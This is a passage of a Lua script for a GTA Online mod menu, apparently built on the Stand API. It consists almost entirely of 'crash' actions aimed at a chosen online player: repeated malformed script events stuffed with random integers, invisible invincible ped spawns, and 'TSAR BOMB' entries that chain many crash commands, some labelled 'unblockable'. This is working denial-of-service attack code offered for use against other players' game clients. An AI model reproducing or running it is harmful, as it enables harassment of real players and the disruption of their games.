            util.trigger_script_event(1 << player_id, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
            util.trigger_script_event(1 << player_id, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
            util.trigger_script_event(1 << player_id, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
            util.trigger_script_event(1 << player_id, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    end)

 menu.action(scrcrash, "Script Crash V6", {"crashv15"}, "Ni yo se, solo intentalo. \nBloqueado por menus populares", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)
    menu.action(scrcrash, "Script Crash V7", {"crashv16"}, "De 2take1", function()
        for i = 1, 50 do
            util.trigger_script_event(1 << player_id, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
            util.trigger_script_event(1 << player_id, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
            util.trigger_script_event(1 << player_id, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
        end
    end)
	
    menu.action(scrcrash, "Script Crash V8", {"crashv17"}, "I don't even know, just try. nBlocked by popular menus", function()
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 17302, 9822, 1999, 6777888, 111222})
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 2327, 0, 0, 0, -307, 27777})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 2327, 0, 0, 0, -307, 27777})
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 27983, 7601, 1020, 3209051, 111222})
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 1010, 0, 0, 0, -2653, 50555})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 1111, 0, 0, 0, -5621, 57766})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, -3, -90, -123, -9856, -97652})
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, -3, -90, -123, -9856, -97652})
        util.trigger_script_event(1 << player_id, {-1881357102, 0, 0, -3, -90, -123, -9856, -97652})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 20547, 1058, 1245, 2721936, 666333})
        util.yield(25)
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 20547, 1058, 1245, 2721936, 666333})
        util.trigger_script_event(1 << player_id, {-1881357102, 0, 0, 20547, 1058, 1245, 2721936, 666333})
        util.trigger_script_event(1 << player_id, {153488394, 0, 868904806, 0, 0, -152, -123, -978, 0, 0, 1, 0, -167, -144})
        util.trigger_script_event(1 << player_id, {153488394, 0, 868904806, 0, 0, 152, 123, 978, 0, 0, 1, 0, 167, 144})
        util.trigger_script_event(1 << player_id, {1249026189, 0, 0, 97587, 5697, 3211, 8237539, 967853})
        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, 0, 1967})
        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, -123, -957, -14, -1908, -123})
        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, 12121, 9756, 7609, 1111111, 789666})
        util.trigger_script_event(1 << player_id, {315658550, 0, 0, 87111, 5782, 9999, 3333333, 888888})
        util.trigger_script_event(1 << player_id, {-877212109, 0, 0, 87111, 5782, 9999, 3333333, 888888})
        util.trigger_script_event(1 << player_id, {1926582096, 0, -1, -1, -1, 18899, 1011, 3070})
        util.trigger_script_event(1 << player_id, {1926582096, 0, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {1033875141, -17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 93})
        util.yield(25)
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 37, 0, -7})
        util.trigger_script_event(1 << player_id, {-1881357102, 0, 0, -13, 0, 0, 0, 23})
        util.trigger_script_event(1 << player_id, {153488394, 0, 868904806, 0, 0, 7, 7, 19, 0, 0, 1, 0, -23, -27})
        util.trigger_script_event(1 << player_id, {1249026189})
        util.trigger_script_event(1 << player_id, {315658550})
        util.trigger_script_event(1 << player_id, {-877212109})
        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, 0, 82})
        util.trigger_script_event(1 << player_id, {1926582096})
        util.trigger_script_event(1 << player_id, {-977515445, 26770, 95398, 98426, -24591, 47901, -64814})
        util.trigger_script_event(1 << player_id, {-1949011582, -1139568479, math.random(0, 4), math.random(0, 1)})
        util.yield(25)
        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 3333, 0, 0, 0, -987, 21369})
        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 2222, 0, 0, 0, -109, 73322})
        util.trigger_script_event(1 << player_id, {-977515445, 26770, 95398, 98426, -24591, 47901, -64814})
        util.trigger_script_event(1 << player_id, {-1949011582, -1139568479, math.random(0, 4), math.random(0, 1)})
        util.trigger_script_event(1 << player_id, {-1730227041, -494, 1526, 60541, -12988, -99097, -32105})
    end)
	
    -- This is a Prisuhm crash fixed by me <3
	
	    local krustykrab = menu.list(twotake, "Crusty Crab Crash", {}, "It's risky to spectate, beware: it works on 2T1 users")

    local peds = 5
    menu.slider(krustykrab, "Number of spatulas", {}, "Send spatulas ah~", 1, 100, 1, 1, function(amount)
        util.toast(players.get_name(player_id).. " Spatulas have been sent")
        peds = amount
    end)

    local crash_ents = {}
    local crash_toggle = false
    menu.toggle(krustykrab, "Number of spatulas", {}, "It's risky to spectate, beware.", function(val)
        util.toast(players.get_name(player_id).. " Spatulas have been sent")
        local crash_toggle = val
        BlockSyncs(player_id, function()
            if val then
                local number_of_peds = peds
                local ped_mdl = util.joaat("ig_siemonyetarian")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                local ped_pos = players.get_position(player_id)
                ped_pos.z += 3
                request_model(ped_mdl)
                for i = 1, number_of_peds do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    crash_ents[i] = ped
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
                end
                repeat
                    for k, ped in crash_ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
                            entities.delete_by_pointer(v)
                        end
                    end
                    util.yield_once()
                    util.yield_once()
                until not (crash_toggle and players.exists(player_id))
                crash_toggle = false
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            else
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            end
        end)
    end)
	
	    local secrashes = menu.list(crashes, "SE Crashes", {}, "")

    menu.action(secrashes, "SE Crash (S0)", {"crashv20"}, "Un crasheo de scripts", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
            end
        util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
    end)

    menu.action(secrashes, "SE Crash (S1)", {"crashv21"}, "Un crasheo de scripts", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    end)

    menu.action(secrashes, "SE Crash (S2)", {"crashv22"}, "Un crasheo de scripts", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            end
        util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
    end)

    menu.action(secrashes, "SE Crash (S3)", {"crashv23"}, "Un crasheo de scripts", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528})
            end
        util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528})
    end)

    menu.action(secrashes, "SE Crash (S4)", {"crashv24"}, "Un crasheo de scripts", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1})
                end
        util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1})
    end)

    menu.action(secrashes, "SE Crash (S7)", {"crashv25"}, "Un crasheo de scripts", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
            end
        util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
    end)
	
		    --menu.action(crashes, "Inbloqueable V3 'Test'", {}, "Pasado de mi menu, no se si funcione", function()
    --    local mdl = util.joaat("apa_mp_apa_yacht")
    --    local user = players.user_ped()
    --    BlockSyncs(player_id, function()
    --        util.yield(250)
    --        local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
    --        PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
    --        PLAYER.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
    --        util.yield(50)
    --        local pos = players.get_position(player_id)
    --        pos.z += 300
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    --        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos, false, false, false)
    --        repeat
    --            util.yield()
    --        until PED.GET_PED_PARACHUTE_STATE(user) == 0
    --        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    --        util.yield(50)
    --        TASK.CLEAR_PED_TASKS(user)
    --        util.yield(50)
    --        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    --        repeat
    --            util.yield()
    --        until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
    --        pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
    --        PLAYER.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
    --        pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos, false, false)
    --    end)
    --end)
--[[
    menu.action(crashes, "Unblockable V3 '2T1'", {"crashv4"}, "", function()
        BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)
    end)

    --menu.action(crashes, "Crash V5 'Test'", {""}, "Un crash antiguo de prisuhm, intente arreglarlo y mejorarlo.", function()
    --    local user = players.user()
    --    local user_ped = players.user_ped()
    --    local pos = players.get_position(user)
    --    BlockSyncs(player_id, function() 
    --        util.yield(100)
    --        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    --        util.yield()
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    --        util.yield(250)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    --        util.yield(1000)
    --        for i = 1, 5 do
    --            util.spoof_script("freemode", SYSTEM.WAIT)
    --        end
    --        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    --        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
    --    end)
    --end)

   menu.action(crashes, "Unblockable V4 'Test'", {"crashv4"}, "It should be fixed, for now", function()
        local mdl = util.joaat("apa_mp_apa_yacht")
        local user = players.user_ped()
        BlockSyncs(player_id, function()
            local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
            PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
            PLAYER.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
            util.yield(50)
            local pos = players.get_position(player_id)
            pos.z += 300
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            repeat
                util.yield()
            until PED.GET_PED_PARACHUTE_STATE(user) == 0
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            util.yield(50)
            TASK.CLEAR_PED_TASKS(user)
            util.yield(50)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            repeat
                util.yield()
            until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
            pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
            PLAYER.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
            pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos, false, false)
        end)
    end) --]]
	
	    --menu.action(crashes, "Unblockable V4 'Test'", {"crashv4"}, "It should be fixed for now", function()
 --    local mdl = util.joaat("apa_mp_apa_yacht")
    --    local user = PLAYER.PLAYER_PED_ID()
    --    local ped_pos = players.get_position(player_id)
    --   BlockSyncs(player_id, function()
    --        local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
    --        PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
    --        PLAYER.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
    --        util.yield(50)
    --        local pos = players.get_position(player_id)
    --        pos.z += 300
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    --        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, ped_pos, false, false, false)
    --        repeat
    --            util.yield()
    --        until PED.GET_PED_PARACHUTE_STATE(user) == 0
    --        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    --        util.yield(50)
    --        TASK.CLEAR_PED_TASKS(user)
    --        util.yield(50)
    --        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    --        repeat
    --            util.yield()
    --        until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    --        PLAYER.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
    --        ENTITY.SET_ENTITY_COORDS(user, ped_pos, false, false)
    --    end)
    --end)
	
    --menu.action(crashes, "Crash V5 'Test'", {""}, "Un crash antiguo de prisuhm, intente arreglarlo y mejorarlo.", function()
    --    local user = players.user()
    --    local user_ped = players.user_ped()
    --    local pos = players.get_position(user)
    --    BlockSyncs(player_id, function()
    --        util.yield(100)
    --        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    --        util.yield()
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    --        util.yield(250)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    --        util.yield(1000)
    --        for i = 1, 5 do
    --            util.spoof_script("freemode", SYSTEM.WAIT)
    --        end
    --        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    --        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
    --    end)
    --end)

    menu.divider(crashes, "(Powerful)")

    menu.action(crashes, "TSAR BOMB", {"tsarbomba"}, "Crash pc demander, if you do not have good pc I do not recommend using it (Unblockable uwu)", function()
        local objective = player_id
        --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("Iniciando...")
        util.toast("Pobre man")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        util.yield(2500)
        menu.trigger_commands("crashv1"..players.get_name(player_id))
        util.yield(400)
        menu.trigger_commands("crashv2"..players.get_name(player_id))
        util.yield(400)
        menu.trigger_commands("crashv3"..players.get_name(player_id))
        util.yield(400)
        menu.trigger_commands("crashv4"..players.get_name(player_id))
        --util.yield(400)
        --menu.trigger_commands("crashv5"..players.get_name(player_id))
        --util.yield(400)
        --menu.trigger_commands("crashv6"..players.get_name(player_id))
        --util.yield(400)
        --menu.trigger_commands("crashv7"..players.get_name(player_id))
        -- Turned off because of a self-crash error
        --util.yield(600)
        --menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(2000)
        menu.trigger_commands("crash"..players.get_name(player_id))
      --  util.yield(400)
      --  menu.trigger_commands("ngcrash"..players.get_name(player_id))
      --  util.yield(400)
      --  menu.trigger_commands("footlettuce"..players.get_name(player_id))
      --  util.yield(400)
      --  menu.trigger_commands("steamroll"..players.get_name(player_id))
        util.yield(1800)
        util.toast("Espera en lo que se limpia todo...")
        --menu.trigger_command(outSync, "off")
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)
    
    menu.action(crashes, "TSAR BOMB V2", {"tsarbomba2"}, "Crash pc demander, if you do not have good pc I do not recommend using it (Unblockable uwu) (Needs regular to work well)", function()
        local objective = player_id
        --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("Iniciando...")
        util.toast("Pobre man")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        util.yield(2500)
        menu.trigger_commands("crashv1"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv2"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv3"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv5"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv6"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv7"..players.get_name(player_id))
        -- Turned off because of a self-crash error
        --util.yield(600)
        --menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(2000)
        menu.trigger_commands("crash"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("ngcrash"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("footlettuce"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("steamroll"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("choke"..players.get_name(player_id))
        util.yield(600)
